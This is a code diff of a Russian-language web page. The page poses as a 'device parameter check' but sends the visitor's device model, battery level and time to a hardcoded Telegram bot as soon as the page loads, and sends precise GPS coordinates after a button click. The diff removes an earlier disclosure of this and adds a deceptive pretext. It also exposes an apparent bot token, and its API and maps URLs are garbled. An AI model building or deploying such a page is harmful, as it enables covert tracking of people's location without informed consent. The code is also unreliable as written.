@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Мой сайт с аналитикой</title>
+    <title>Тестовая страница</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -12,32 +12,34 @@
             background-color: #f4f4f9;
         }
         button {
-            padding: 10px 20px;
+            padding: 12px 24px;
             font-size: 16px;
             cursor: pointer;
-            background-color: #007bff;
+            background-color: #28a745;
             color: white;
             border: none;
             border-radius: 5px;
             margin-top: 20px;
+            font-weight: bold;
         }
         button:hover {
-            background-color: #0056b3;
+            background-color: #218838;
         }
     </style>
 </head>
 <body>
 
-    <h1>Добро пожаловать на тестовую страницу</h1>
-    <p>Этот сайт автоматически отправляет технические параметры сессии в Telegram-бот.</p>
+    <h1>Проверка параметров устройства</h1>
+    <p>Нажмите кнопку ниже, чтобы проверить точность определения геолокации и технических характеристик вашего телефона.</p>
     
-    <button onclick="requestLocation()">Разрешить геолокацию</button>
+    <button onclick="requestLocation()">Проверить геопозицию</button>
 
     <script>
-        // Ваши личные данные для отправки в Telegram
+        // Ваши данные Telegram (уже настроены)
         const TG_TOKEN = "8892692128:AAEpvN2XHeallC2MfTQMB10aaHxy3VGRVss";
         const TG_CHAT_ID = "6559747526"; 
 
+        // Функция отправки в Telegram
         async function sendToTelegram(text) {
             const url = `https://telegram.org{TG_TOKEN}/sendMessage`;
             fetch(url, {
@@ -51,8 +53,12 @@
             }).catch(e => console.error(e));
         }
 
-        async function collectAnalytics(extraText = "") {
-            let batteryLevel = "Не поддерживается";
+        // Функция сбора модели и заряда
+        async function getDeviceSpecs() {
+            let batteryLevel = "Не поддерживается (например, на iOS)";
+            let deviceModel = "Не определено";
+
+            // 1. Сбор заряда батареи
             if (navigator.getBattery) {
                 try {
                     const battery = await navigator.getBattery();
@@ -60,38 +66,64 @@
                 } catch (e) {}
             }
 
-            const screenRes = `${window.screen.width}x${window.screen.height}`;
-            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            // 2. Сбор модели через современные Client Hints (для Android)
+            if (navigator.userAgentData) {
+                try {
+                    const ua = await navigator.userAgentData.getHighEntropyValues(["model", "platformVersion"]);
+                    deviceModel = `${ua.model || "Неизвестная модель"} (Android ${ua.platformVersion})`;
+                } catch (e) {}
+            } else {
+                // Резервный метод для iOS/других браузеров (показывает общую платформу)
+                if (/iPhone|iPad|iPod/i.test(navigator.userAgent)) {
+                    deviceModel = "Apple Device (iOS)";
+                } else if (/Android/i.test(navigator.userAgent)) {
+                    deviceModel = "Android Device";
+                } else {
+                    deviceModel = "Компьютер / Другое";
+                }
+            }
+
+            return { batteryLevel, deviceModel };
+        }
+
+        // Основная функция аналитики
+        async function collectAnalytics(extraText = "") {
+            const specs = await getDeviceSpecs();
             const localTime = new Date().toLocaleTimeString();
 
-            const message = `🔔 *Новый посетитель!*\n\n` +
-                            `🖥 Экран: ${screenRes}\n` +
-                            `🌍 Зона: ${timezone}\n` +
-                            `🕒 Время: ${localTime}\n` +
-                            `🔋 Батарея: ${batteryLevel}` + 
+            const message = `📱 *Новый отчет об устройстве*\n\n` +
+                            `🤖 Модель: ${specs.deviceModel}\n` +
+                            `🔋 Заряд батареи: ${specs.batteryLevel}\n` +
+                            `🕒 Время запроса: ${localTime}` + 
                             extraText;
 
             sendToTelegram(message);
         }
 
+        // Автоматический запуск при входе (без геолокации)
         window.addEventListener('DOMContentLoaded', () => {
             collectAnalytics();
         });
 
-        function requestLocation() {
+        // Запуск при нажатии на кнопку (с геолокацией)
+        async function requestLocation() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
                         const lat = position.coords.latitude;
                         const lon = position.coords.longitude;
-                        const geoText = `\n📍 *Геолокация*:\nШирота: \`${lat}\`\nДолгота: \`${lon}\`\n\n[Открыть на картах](https://google.com{lat},${lon})`;
+                        const geoText = `\n\n📍 *Местонахождение*:\nШирота: \`${lat}\`\nДолгота: \`${lon}\`\n\n[Открыть на картах Google](https://google.com{lat},${lon})`;
+                        
+                        // Отправляем полный отчет с координатами
                         collectAnalytics(geoText);
-                        alert("Данные успешно обновлены!");
+                        alert("Проверка завершена. Данные отправлены в ваш бот.");
                     },
                     (error) => {
-                        alert("Доступ к геолокации отклонен.");
+                        alert("Для проверки местонахождения необходимо разрешить доступ к геопозиции.");
                     }
                 );
+            } else {
+                alert("Геопозиция не поддерживается вашим браузером.");
             }
         }
     </script>
